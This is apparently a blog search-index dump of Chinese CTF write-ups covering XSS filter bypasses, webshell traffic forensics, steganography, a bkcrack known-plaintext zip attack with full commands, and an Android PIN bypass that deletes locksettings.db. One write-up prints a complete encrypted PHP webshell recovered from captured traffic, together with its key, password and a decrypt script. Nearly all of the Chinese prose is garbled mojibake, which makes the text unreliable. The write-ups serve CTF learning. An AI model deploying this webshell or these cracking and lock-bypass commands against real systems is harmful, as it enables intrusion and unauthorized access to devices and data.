æ ¼å¼ï¼š&amp;#ç¼–ç çš„åè¿›åˆ¶æ•°å€¼ï¼Œä¸€èˆ¬çš„æ ¼å¼è¿˜æœ‰ç›´æ¥\\uå¼€å¤´çš„16è¿›åˆ¶å››ä½ç¼–ç ï¼Œä¸€å®šæ˜¯å››ä½ï¼Œå¦åˆ™æŠ¥é”™\n\nè¿˜æœ‰ä¸€ç§é¢˜è§£ï¼Œå»¶ç»­ä¸Šä¸€é¢˜çš„åšæ³•ï¼Œå› ä¸ºåŸŸåæ˜¯å¯¹å¤§å°å†™ä¸æ•æ„Ÿçš„\n0x0Cå¤šè¿‡æ»¤äº†ä¸€ä¸ªscriptï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå½±å“ï¼Œä¸Šé¢˜é¢˜è§£ä»ç„¶å¯ç”¨\n0x0Dæ­¤å…³æ˜¯å¯¹äºè¾“å…¥çš„&lt; / &quot; &#39;ç­‰è¿›è¡Œäº†è¿‡æ»¤ï¼Œå°†å…¶è½¬æ¢æˆç©ºï¼Œå¹¶ä¸”åœ¨è¾“å…¥å¤„è¿›è¡Œäº†å•è¡Œæ³¨é‡Šï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡ä½¿ç”¨æ¢è¡Œç¬¦è¿›è¡Œç»•è¿‡ï¼Œä½†æ¢è¡Œä»…èƒ½è¿‡å•è¡Œæ³¨é‡Šï¼Œä»£ç è¿˜æ˜¯ä¸èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿™é‡Œå¯ä½¿ç”¨htmlæ³¨é‡Š--&gt;æ¥æ³¨é‡Šåé¢çš„jsï¼Œä½¿ä»£ç æ­£å¸¸è¿è¡Œ\nå¯¹äºè¿™é‡Œä½¿ç”¨htmlçš„æ³¨é‡Šç¬¦ä¹Ÿèƒ½é—­åˆjså•è¡Œæ³¨é‡Šï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°è¯´å¯¹äºé‚£äº›ä¸æ”¯æŒJavaScriptçš„æµè§ˆå™¨ä¼šæŠŠè„šæœ¬ä½œä¸ºé¡µé¢çš„å†…å®¹æ¥æ˜¾ç¤º;ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™æ ·çš„HTMLæ³¨é‡Šæ ‡ç­¾\nå¯ä»¥çœ‹åˆ°è¿™é‡Œå°±æ˜¯ä½¿ç”¨äº†htmlæ ‡ç­¾é—­åˆçš„js,å¯¹äº&lt;!--å’Œ--&gt;éƒ½å¯ä»¥åœ¨htmlçš„scriptæ ‡ç­¾é‡Œå•ç‹¬ä½¿ç”¨è¿›è¡Œå•è¡Œæ³¨é‡Šï¼Œè¿™é‡Œ&lt;è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä½¿ç”¨--&gt;\n\n0x0Eæ­¤å…³å¯¹äºæ‰€æœ‰ä»¥&lt;å¼€å¤´çš„åŠ ä»»æ„å¤§å°å†™å­—ç¬¦çš„è¿›è¡Œæ›¿æ¢ä¸º&lt;_ä¸”å†å°†æ‰€æœ‰å°å†™å­—æ¯æ¢æˆå¤§å†™\nè¿™é‡Œå‚è€ƒå®˜æ–¹é¢˜è§£åå­¦åˆ°äº†ä¸€äº›éªšæ“ä½œï¼Œå¯¹äºÅ¿å¤è‹±è¯­ä¸­çš„sçš„å†™æ³•, è½¬æˆå¤§å†™æ˜¯æ­£å¸¸çš„S,ä»è€Œå¯ä»¥ç»•è¿‡&lt;script&gt;é™åˆ¶\n\n0x0Fæ­¤å…³è¿˜æ˜¯å¯¹äºè¾“å…¥çš„ä¸€äº›ç¬¦å·è¿›è¡Œäº†ç¼–ç æ“ä½œï¼Œä½†å¯¹html inline jsè½¬ä¹‰æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œæµè§ˆå™¨ä¼šå…ˆè§£æhtml, ç„¶åå†è§£æjs\nä½†æ˜¯ç”±äºè¾“å…¥ä¿¡æ¯æ˜¯åœ¨imgæ ‡ç­¾å†…ï¼Œæ‰€ä»¥htmlå®ä½“ç¼–ç æ˜¯å¯ä»¥è¢«ç›´æ¥è§£æçš„,æ‰€ä»¥é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œåœ¨æ„é€ è¯­å¥å³å¯ï¼Œè¿™é‡Œonerroråé¢ç”¨åˆ†å·é—­åˆåæ„Ÿè§‰ç±»å‹å †å æ‰§è¡Œä¸€æ ·ã€‚\n\n","tags":["Web","XSS"]},{"title":"(é™‡å‰‘æ¯ 2021) webshellç³»åˆ—","url":"/2022/04/29/webshell/","content":"è¿™æ˜¯ä¸€ä¸ªå¤§èµ›åŸé¢˜ç³»åˆ—ï¼Œæ€»å…±ä¸ƒé“é¢˜ï¼Œé¢˜ç›®åœ¨è¿™å„¿\nï¼ˆ1ï¼‰webshell ï¼Œæƒ³ä¸€æƒ³ï¼Œåº”è¯¥æ˜¯postä¼ è¾“ï¼Œç­›é€‰ä¸€ä¸‹post\n\néšä¾¿ç‚¹å¼€ç¬¬ä¸€ä¸ªçœ‹ä¸€ä¸‹\n\nå°±æœ‰äº†ï¼Œæˆ–è€…æœç´¢ä¸€ä¸‹passwordä¹Ÿå¯ä»¥\nï¼ˆ2ï¼‰ç»å¯¹è·¯å¾„çš„è¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆï¼Œä¸€ä¸ªæ˜¯ç½‘ç«™æ ¹ç›®å½•ï¼Œå¦ä¸€ä¸ªæ˜¯ç›¸å¯¹è·¯å¾„\nå¯¼å‡ºHTTPå¯¹è±¡ï¼Œä¸€ä¸ªä¸ªæ‰¾ï¼Œåœ¨index.php%3fm=home&amp;a=assign_resume_tplæ–‡ä»¶ä¸­å‘ç°äº†å«æœ‰phpinfo()é¡µé¢çš„ä¸œè¥¿\n\nå°†å…¶åç¼€å˜æ›´ä¸º.htmlç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œå…ˆæŸ¥æ‰¾ç½‘ç«™æ ¹è·¯å¾„ä¸º/var/www/html\n\nåœ¨PHPå˜é‡ä¸­æŸ¥æ‰¾.logåç¼€çš„æ—¥å¿—æ–‡ä»¶ï¼Œè·¯å¾„ä¸ºdata/Runtime/Logs/Home/21_08_07.logï¼Œä¸¤ä¸ªæ‹¼èµ·æ¥å°±æ˜¯ç­”æ¡ˆ\n\næˆ‘çœ‹åˆ«äººä¹Ÿæœ‰è¿™æ ·åšçš„\nç­›é€‰postï¼Œï¼ˆ1ï¼‰é‡Œè¯´è¿‡\nè·ŸåŒ…ï¼Œè·Ÿåˆ°332\n\næ‹¼æ¥ä¸€ä¸‹å°±æœ‰äº†\nï¼ˆ3ï¼‰è¯´åˆ°æƒé™ï¼Œå¯èƒ½ä¼šæ‰§è¡Œwhoamiå‘½ä»¤ï¼Œæˆ‘ä»¬å…¨å±€æœç´¢whoamiï¼Œæ‰¾åˆ°ç¬¬317å·æ•°æ®è¯·æ±‚åŒ…ä¸­åŒ…å« whoamiå‘½ä»¤ï¼Œç¬¬319å·å“åº”åŒ…ä¸­åŒ…å«ç»“æœ\n\næ ¹æ®ï¼ˆ2ï¼‰çš„phpinfo()ï¼Œå…¶å®å¯ä»¥å¾—åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚è¿™ä¸€é¢˜çš„ç­”æ¡ˆ\n\nï¼ˆ4ï¼‰å€ŸåŠ©ï¼ˆ2ï¼‰çš„åˆ†æï¼Œå¾ˆå®¹æ˜“å°±èƒ½å¾—åˆ°\nç­”æ¡ˆæ˜¯1.php\nï¼ˆ5ï¼‰ç¬¬ä¸€ç§æ–¹æ³•æ˜¯çŒœæµ‹ï¼Œä¸€èˆ¬æ¥è¯´ä»£ç†å·¥å…·å®¢æˆ·ç«¯å°±æ˜¯frpcï¼Œç„¶åæœç´¢ä¸€ä¸‹ï¼Œè¿˜çœŸæ˜¯\n\nç¬¬äºŒç§æ–¹æ³•ï¼Œå……åˆ†åˆ©ç”¨wireshark å¯¼å‡ºå¯¹è±¡çš„åŠŸèƒ½ï¼Œå¯¼å‡ºHTTPå¯¹è±¡ï¼Œç„¶åä¿å­˜ä¸‹æ¥\n1(51).phpå°±æ˜¯æŸ¥çœ‹ä¸Šä¼ åçš„æœ¨é©¬æ–‡ä»¶ç›®å½•\n\nè¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯æˆ‘æœ€ä¸æ¨èçš„ï¼Œä¸å¥½ç†è§£ï¼Œä¹Ÿæœ‰ç‚¹éº»çƒ¦\nå­¦ä¹ äº†åˆ«çš„å¸ˆå‚…çš„WPï¼Œ\nå°†344åŒ…TCPæµUrldecodeï¼Œå‘ç°ä¸€ä¸ªsubstr,ä»ç¬¬2ä½å¼€å§‹æˆªå–ï¼Œæ‰€ä»¥ä¸‹é¢ç±»ä¼¼base64çš„ç¼–ç å»æ‰å‰ä¸¤ä½ï¼ˆæˆªå›¾ä¸­å°‘å¤åˆ¶ä¸€ä¸ª%3Dï¼Œæœ«å°¾ç¼ºä¸ªç­‰å·ï¼‰ç„¶åç»§ç»­urldecodeä¸€æ³¢ã€‚\n\nç„¶åç»§ç»­urldecodeä¸€æ³¢ï¼ˆéœ€è¦ç”¨å¯ä»¥è§£ç ç‰¹æ®Šå­—ç¬¦çš„ï¼Œå¼ºçƒˆå®‰åˆ©CyberChefï¼‰\n\nï¼ˆ6ï¼‰ï¼ˆ7ï¼‰è¿™ä¸€é¢˜ï¼Œå’±ä»¬é‡‡ç”¨ï¼ˆ2ï¼‰ä¸­ç›¸åŒçš„åšæ³•ï¼ŒæŠŠæ‰€æœ‰çš„HTTPå¯¹è±¡å¯¼å‡ºï¼Œç„¶åæŒ¨ä¸ªçœ‹ï¼Œå°±ä¼šå‘ç°1(6).phpä¸­æœ‰ä¸ªaaa=\nå°±å¾ˆæœ‰å¯èƒ½æ˜¯ä¸Šä¼ çš„è¢‹é‡Œé…ç½®æ–‡ä»¶ã€‚\n\nï¼ˆå½“ç„¶è¿™é¢˜ä½ ä¹Ÿå¯ä»¥è¿½è¸ªæµæ¥çœ‹ï¼Œå¦‚æœä¸å«Œéº»çƒ¦çš„è¯ï¼‰\nè¿˜æ˜¯CyberChef\nè§£ç ä¸€ä¸‹ï¼Œå°±èƒ½å‘ç°è¿™é¢˜çš„flag\nåŒæ—¶ï¼Œä¼šæƒŠå¥‡çš„å‘ç°ï¼ˆ7ï¼‰çš„flag\n\n","tags":["wp","flow","Misc"]},{"title":"welcome to my blog","url":"/2022/07/27/welcome-to-my-blog/","content":"æˆ‘æ˜¯Charmersixï¼Œè¿™ä¸ªåå­—ï¼Œå¤§å®¶å¯èƒ½ä¸è®¤è¯†ï¼Œä½ ä»¬å¯ä»¥å«æˆ‘C&amp;S,å®åœ¨ä¸è¡Œï¼Œå¯ä»¥å«æˆ‘å°å…­ã€‚æ˜¯ä¸€åå°å­¦ç”Ÿctferï¼Œä¸ºäº†æ–¹ä¾¿è‡ªå·±è®°ç¬”è®°ï¼Œæ‰€ä»¥æ•ˆä»¿èº«è¾¹çš„å¤§ä½¬ï¼Œæ­äº†è¿™ä¸ªblogã€‚è¿™é‡Œå°†ä¼šå†™ä¸€äº›wpã€‚è™½ç„¶å«wpï¼Œä½†æ˜¯å°±æ˜¯ä¸ªäººçš„åˆ·é¢˜ç¬”è®°ï¼Œæ—¢ç„¶æ˜¯ç¬”è®°ï¼Œå°±ä¼šæœ‰äº›åœ°æ–¹è¯¦ç»†ï¼Œæœ‰äº›åœ°æ–¹ç²—ç•¥ã€‚éƒ½ä¸ä¸€å®šæœ‰äººçœ‹ï¼Œæ‰€ä»¥å…¨å½“è‡ªå·±ç¬”è®°ã€‚\n","tags":["Blog"]},{"title":"è¥¿æ¹–è®ºå‰‘MISC","url":"/2023/02/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC/","content":"MP3æ‹–è¿›winhex, å‘ç°ç»“å°¾æ˜¯ä¸€å¼ png, foremoståˆ†å‡ºæ¥è¯•ä¸€ä¸‹\nforemost /home/kali/Desktop/cipher.mp3\n\nå¾—åˆ°ä¸€å¼ è¿™æ ·å¾ˆåƒæ‰“äº†ç çš„äºŒç»´ç , ä½†åˆä¸æ˜¯äºŒç»´ç çš„å›¾ç‰‡\nè¿™é‡Œæˆ‘ä»¬æ²¡æœ‰æ€è·¯, å†æ”¾è¿›zstegé‡Œè·‘ä¸€ä¸‹\nzsteg flag.png --all\n\n\nå‘ç°zipä¸€ä¸ª, å°†å…¶æå–å‡ºæ¥\nzsteg -e &#x27;b1,r,lsb,xy&#x27; flag.png &gt; flag.zip\n\næœ‰å¯†ç , æ”¾åˆ°çˆ†ç ´é‡Œçœ‹ä¸€ä¸‹, çœ‹æ¥æ˜¯æ²¡æˆ, å‰©ä¸‹çš„æ€è·¯å°±æ˜¯MP3é‡Œåº”è¯¥è¿˜éšå†™äº†ä¸œè¥¿, MP3Stegoè·‘ä¸€ä¸‹\n\nè§£å‹æ‹¿åˆ°47.txt\n2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj\n\nå”¯ä¸€æç¤º: 47, å»ç™¾åº¦å¯»æ‰¾ç­”æ¡ˆ\n\né‚£å°±è¯•è¯•rot47\n\nå¾—åˆ°ä¸€æ®µå†…å®¹\na=~[];a=&#123;___:++a,aaaa:(![]+&quot;&quot;)[a],__a:++a,a_a_:(![]+&quot;&quot;)[a],_a_:++a,a_aa:(&#123;&#125;+&quot;&quot;)[a],aa_a:(a[a]+&quot;&quot;)[a],_aa:++a,aaa_:(!&quot;&quot;+&quot;&quot;)[a],a__:++a,a_a:++a,aa__:(&#123;&#125;+&quot;&quot;)[a],aa_:++a,aaa:++a,a___:++a,a__a:++a&#125;;a.a_=(a.a_=a+&quot;&quot;)[a.a_a]+(a._a=a.a_[a.__a])+(a.aa=(a.a+&quot;&quot;)[a.__a])+((!a)+&quot;&quot;)[a._aa]+(a.__=a.a_[a.aa_])+(a.a=(!&quot;&quot;+&quot;&quot;)[a.__a])+(a._=(!&quot;&quot;+&quot;&quot;)[a._a_])+a.a_[a.a_a]+a.__+a._a+a.a;a.aa=a.a+(!&quot;&quot;+&quot;&quot;)[a._aa]+a.__+a._+a.a+a.aa;a.a=(a.___)[a.a_][a.a_];a.a(a.a(a.aa+&quot;\\&quot;&quot;+a.a_a_+(![]+&quot;&quot;)[a._a_]+a.aaa_+&quot;\\\\&quot;+a.__a+a.aa_+a._a_+a.__+&quot;(\\\\\\&quot;\\\\&quot;+a.__a+a.___+a.a__+&quot;\\\\&quot;+a.__a+a.___+a.__a+&quot;\\\\&quot;+a.__a+a._a_+a._aa+&quot;\\\\&quot;+a.__a+a.___+a._aa+&quot;\\\\&quot;+a.__a+a._a_+a.a__+&quot;\\\\&quot;+a.__a+a.___+a.aa_+&quot;&#123;&quot;+a.aaaa+a.a___+a.___+a.a__a+a.aaa+a._a_+a.a_a+a.aaa+a.aa_a+a.aa_+a.a__a+a.a__a+a.aa_a+a.aaa+a.aaaa+a.aa_a+a.a_aa+a.a_a_+a.aaa+a.aaa_+a.a__a+a.aaa+a.a_a_+a.__a+a.a_a+a.aa__+a.a__+a.aaaa+a.a__a+a.a__+a.a_aa+a.a__+&quot;&#125;\\\\\\&quot;\\\\&quot;+a.a__+a.___+&quot;);&quot;+&quot;\\&quot;&quot;)())();\n\nåƒæ˜¯jså†…å®¹, ç›´æ¥æµè§ˆå™¨è¿è¡Œä¸€ä¸‹, æ‹¿åˆ°flag:DASCTF&#123;f8097257d699d7fdba7e97a15c4f94b4&#125;\n\nå½“ç„¶, è¿™é‡Œæˆ‘äº†è§£åˆ°ä»–æ˜¯jsfuck, å·¥å…·åœ¨è¿™\n\nå¯ä»¥çœ‹ä¸€ä¸‹è¿™é‡Œ\ntake_the_zip_easyè¿™é‡Œåˆ©ç”¨ä¸€ä¸ªæ˜æ–‡æ”»å‡», æ‰€è°“æ˜æ–‡æ”»å‡»å°±æ˜¯é€šè¿‡ç›®å‰å·²çŸ¥çš„éƒ¨åˆ†ä¿¡æ¯, å»æ”»å‡»å¾—åˆ°æœªçŸ¥çš„ä¸€äº›ä¿¡æ¯, é‚£ä¹ˆè¿™ä¸ªå‹ç¼©åŒ…æˆ‘ä»¬æœ‰ä»€ä¹ˆå·²çŸ¥çš„å‘¢?\næˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªå‹ç¼©åŒ…çš„å‹ç¼©æ–¹å¼\n\nZIPçš„åŠ å¯†ç®—æ³•å¤§è‡´åˆ†ä¸ºä¸¤ç§ZipCryptoå’ŒAES-256,å„è‡ªåˆåˆ†Deflateå’ŒStoreã€‚\n\nZipCrypto Deflate\nZipCrypto Store\nAES-256 Deflate\nAES-256 Store\n\nZipCryptoç®—æ˜¯ä¼ ç»Ÿçš„zipåŠ å¯†æ–¹å¼ã€‚åªæœ‰ä½¿ç”¨ZipCrypto Deflate /Storeæ‰å¯ä»¥ä½¿ç”¨ ZIPå·²çŸ¥æ˜æ–‡æ”»å‡»è¿›è¡Œç ´è§£ã€‚\nä¼ ç»Ÿçš„ZIPå·²çŸ¥æ˜æ–‡æ”»å‡»åˆ©ç”¨ï¼Œwindowsä¸‹å¯ä»¥ä½¿ç”¨AZPRï¼Œlinuxä¸‹å¯ä»¥ä½¿ç”¨pkcrackã€‚\n\n\né‚£ä¹ˆè¿™ä¸ªå‹ç¼©åŒ…æœ‰ä»€ä¹ˆæ˜¯æˆ‘ä»¬å·²çŸ¥çš„å‘¢, æˆ‘ä»¬æ¥winhexç»†çœ‹ä¸€ä¸‹\nå¾ˆæ˜æ˜¾è¿™ä¸ªåå­—æ˜¯æˆ‘ä»¬å·²çŸ¥çš„, å¹¶ä¸”, é‚£æˆ‘ä»¬æŠŠè¿™åå­—çš„åå…­è¿›åˆ¶æ•°å€¼copyå‡ºæ¥646173666C6F772E706361706E67, ç„¶åé€šè¿‡å‘½ä»¤ .\\bkcrack.exe -C .\\zipeasy.zip -c dasflow.zip -x 30 646173666c6f772e706361706e67 -x 0 504B0304\næ‹¿åˆ°k\n2b7d78f3 0ebcabad a069728c\n\nç„¶åå†é€šè¿‡å‘½ä»¤ ./bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zipæ‹¿åˆ°æµé‡åŒ…\nå¯¼å‡ºHTTPå¯¹è±¡, å‘ç°flag.zip\n\nå‘ç°è¿˜æ˜¯æœ‰å¯†ç çš„, æˆ‘ä»¬ç»§ç»­ç¿»é˜…æµé‡åŒ…, è¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯é»‘å®¢ä¸Šä¼ çš„webshell, ç„¶åæˆ‘ä»¬è¿½è¸ªæœ€åä¸€æ¡eval.phpçœ‹ä¸€ä¸‹, å¯æƒœè¢«åŠ å¯†è¿‡, é‚£ä¹ˆæˆ‘ä»¬å¾€å‰ç¿», çœ‹ä¸€ä¸‹ä»–çš„åŠ å¯†æ–¹å¼\næˆ‘ä»¬å¯ä»¥åœ¨ç¬¬å…­ä¸ªTCPæµé‡Œå‘ç°è¿™ä¸²åŠ å¯†ä»£ç \n&lt;?php@session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K)&#123;    for($i=0;$i&lt;strlen($D);$i++) &#123;        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    &#125;    return $D;&#125;$pass=&#x27;air123&#x27;;$payloadName=&#x27;payload&#x27;;$key=&#x27;d8ea7326e6ec5916&#x27;;if (isset($_POST[$pass]))&#123;    $data=encode(base64_decode($_POST[$pass]),$key);    if (isset($_SESSION[$payloadName]))&#123;        $payload=encode($_SESSION[$payloadName],$key);        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;            $payload=encode($payload,$key);        &#125;        eval($payload);        echo substr(md5($pass.$key),0,16);        echo base64_encode(encode(@run($data),$key));        echo substr(md5($pass.$key),16);    &#125;else&#123;        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;            $_SESSION[$payloadName]=encode($data,$key);        &#125;    &#125;&#125;\n\nç„¶åæˆ‘ä»¬è®©Chat GPTå¸®å¿™çœ‹ä¸€ä¸‹\n\nè¿™æ®µä»£ç æ˜¯ä¸€æ®µ PHP ä»£ç ï¼Œå®ƒå®ç°äº†ä¸€ä¸ªç®€å•çš„åŠ å¯†å’Œè§£å¯†æœºåˆ¶ï¼ŒåŒæ—¶å®ç°äº†ä¸€ä¸ªç®€å•çš„ Webshell åŠŸèƒ½ã€‚\né¦–å…ˆï¼Œè¿™æ®µä»£ç ä½¿ç”¨ @session_start() å¼€å§‹ä¸€ä¸ªä¼šè¯ï¼Œç„¶åä½¿ç”¨ @set_time_limit(0) ç¦æ­¢è„šæœ¬æ‰§è¡Œè¶…æ—¶ï¼Œæœ€åä½¿ç”¨ @error_reporting(0) å…³é—­é”™è¯¯æŠ¥å‘Šã€‚\næ¥ä¸‹æ¥æ˜¯ encode() å‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•° $D å’Œ $Kï¼Œå…¶ä¸­ $D æ˜¯å¾…åŠ å¯†/è§£å¯†çš„å­—ç¬¦ä¸²ï¼Œ$K æ˜¯å¯†é’¥ã€‚å‡½æ•°çš„ä¸»è¦ä½œç”¨æ˜¯å°† $D å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†æˆ–è§£å¯†ï¼Œå…·ä½“æ“ä½œæ˜¯æŒ‰ä½å¼‚æˆ–ï¼ˆXORï¼‰æ¯ä¸ªå­—ç¬¦ä¸å¯†é’¥ä¸­çš„å­—ç¬¦è¿›è¡Œè¿ç®—ï¼Œç„¶åè¿”å›åŠ å¯†/è§£å¯†åçš„ç»“æœã€‚\nä»£ç ä¸­å®šä¹‰äº†å››ä¸ªå˜é‡ï¼š\n\n$passï¼šå¯†ç ï¼Œç”¨äºéªŒè¯ POST è¯·æ±‚æ˜¯å¦åˆæ³•ã€‚\n$payloadNameï¼šæœ‰æ•ˆè½½è·åç§°ï¼Œç”¨äºå­˜å‚¨ä» POST è¯·æ±‚ä¸­è·å–çš„æœ‰æ•ˆè½½è·ã€‚\n$keyï¼šåŠ å¯†å¯†é’¥ï¼Œç”¨äºåŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚\n$dataï¼šä» POST è¯·æ±‚ä¸­è·å–çš„åŠ å¯†çš„æ•°æ®ã€‚\n\nä»£ç çš„ä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼š\n\nå¦‚æœ POST è¯·æ±‚ä¸­åŒ…å«äº† $pass å˜é‡ï¼Œé‚£ä¹ˆå°†ä» POST è¯·æ±‚ä¸­è·å–åˆ°çš„æ•°æ® $data è¿›è¡Œè§£å¯†ï¼Œç„¶åä½¿ç”¨ $payloadName å˜é‡å­˜å‚¨æœ‰æ•ˆè½½è·ï¼Œå¦‚æœæœ‰æ•ˆè½½è·ä¸­åŒ…å«äº† getBasicsInfo å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆç›´æ¥å­˜å‚¨ï¼Œå¦åˆ™å¯¹æœ‰æ•ˆè½½è·è¿›è¡ŒåŠ å¯†åå†å­˜å‚¨ã€‚\nå¦‚æœæ²¡æœ‰åŒ…å« $pass å˜é‡ï¼Œé‚£ä¹ˆæ£€æŸ¥æœ‰æ•ˆè½½è·ä¸­æ˜¯å¦åŒ…å«äº† getBasicsInfo å­—ç¬¦ä¸²ï¼Œå¦‚æœåŒ…å«äº†ï¼Œåˆ™è¡¨ç¤ºè¦æ‰§è¡Œå‘½ä»¤ï¼Œå¦åˆ™ä¸åšä»»ä½•å¤„ç†ã€‚\n\næœ€åï¼Œä»£ç ä½¿ç”¨ eval() å‡½æ•°æ‰§è¡Œå­˜å‚¨åœ¨æœ‰æ•ˆè½½è·ä¸­çš„ PHP ä»£ç ï¼Œå¹¶å°†æ‰§è¡Œç»“æœè¿›è¡ŒåŠ å¯†åè¾“å‡ºã€‚åŒæ—¶ï¼Œä»£ç è¿˜è¾“å‡ºäº†ä¸€ä¸ªå“ˆå¸Œå€¼ï¼ŒåŒ…æ‹¬å¯†ç å’Œå¯†é’¥çš„ MD5 å“ˆå¸Œå€¼çš„å‰ 16 ä¸ªå­—ç¬¦å’Œå 16 ä¸ªå­—ç¬¦ï¼Œç”¨äºéªŒè¯å¯†ç å’Œå¯†é’¥æ˜¯å¦æ­£ç¡®ã€‚\n\nè§£å¯†è„šæœ¬\n&lt;?phpfunction encode($D, $K)&#123;    for ($i = 0; $i &lt; strlen($D); $i++) &#123;        $c = $K[$i + 1 &amp; 15];        $D[$i] = $D[$i] ^ $c;    &#125;    return $D;&#125;//$pass=&#x27;air123&#x27;;$key = &#x27;d8ea7326e6ec5916&#x27;;$a = &#x27;J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3&#x27;;//$b = substr($a, 16, strlen($a) - 32);echo gzdecode(encode(base64_decode($a), $key));\n\nç„¶åæˆ‘ä»¬ç›´æ¥çœ‹æ¯”è¾ƒé åçš„åŒ…ï¼Œç»ˆäºåœ¨æˆ‘ä»¬çš„36æµ, å‘ç°äº†å¯†ç airDAS1231qaSW@\næœ€ç»ˆæ‹¿åˆ°flag\næœºä½ å¤ªç¾ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªnpbkæ–‡ä»¶, npbkå¯ä»¥å½“ä½œä¸€ä¸ªå‹ç¼©åŒ…ç„¶åç›´æ¥åˆ†æä»–é‡Œè¾¹çš„vmdk, ç›´æ¥ä¿®æ”¹åç¼€ä¸ºzip, è§£å‹æ‹¿åˆ°vmdk, npbkä¹Ÿæç¤ºæˆ‘ä»¬è¿™æ˜¯ä¸ªå®‰å“ç³»ç»Ÿ, æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å…¶å¯¼å…¥æ¨¡æ‹Ÿå™¨, è¿™é‡Œæˆ‘ç”¨çš„æ˜¯å¤œç¥, å…¶ä»–çš„åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„\n\nç„¶åæˆ‘ä»¬å¼€å¯è¿™å°æœºå™¨, å‘ç°æœ‰å¯†ç \nå¤§éƒ¨åˆ†äººå‚è€ƒçš„éƒ½æ˜¯è¿™ç¯‡æ–‡ç« \næˆ‘ä»¬å¯ä»¥å€Ÿç”¨noxè‡ªå¸¦çš„adb shell\nè¿™é‡Œå¼€å¯è™šæ‹Ÿæœº, ç„¶åç›´æ¥ç»ˆç«¯æ‰“å¼€åˆ°Nox/binç›®å½•å³å¯\n\nç„¶åç›´æ¥æ‰§è¡Œ\nrm /data/system/locksettings.db\n\nå³å¯æ¸…æ¥špinç \n\nçœ‹èµ·æ¥ä¸€åˆ‡æ­£å¸¸, åªæœ‰ä¸€ä¸ªSkredè²Œä¼¼å¯ä»¥åˆ©ç”¨\nè¿™é‡Œæ˜¯ä¸¤ä¸ªäººçš„èŠå¤©è®°å½•, ä¸€å †å‹ç¼©åŒ…ä»¥åŠä¸¤å¼ å›¾ç‰‡\næˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œå°†å›¾ç‰‡ä¿å­˜å‡ºæ¥åˆ°pcä¸Š\näºŒè¯ä¸è¯´, zstegè·‘ä¸€ä¸‹è¯•è¯•, çœ‹çš„æˆ‘å¤´çš®å‘éº», ä¹Ÿæ²¡çœ‹å‡ºæœ‰ä»€ä¹ˆçŒ«è…»\nå†æ‰“å¼€stegsolveè¿™ä¸ªè½¯ä»¶ä¹Ÿè®¸ä¼šæ›´ç›´è§‚ä¸€ç‚¹, alpha2å¾ˆæ˜æ˜¾æœ‰ä¸œè¥¿, ç›´æ¥æå‡ºæ¥çœ‹çœ‹\n\nä¿å­˜å‡ºæ¥ä¼šå‘ç°ä¸€äº›ä¸ä¸€æ ·çš„åœ°æ–¹, è¿™é‡Œä¸€å®šè¦ç»†å¿ƒä¸€ç‚¹, å› 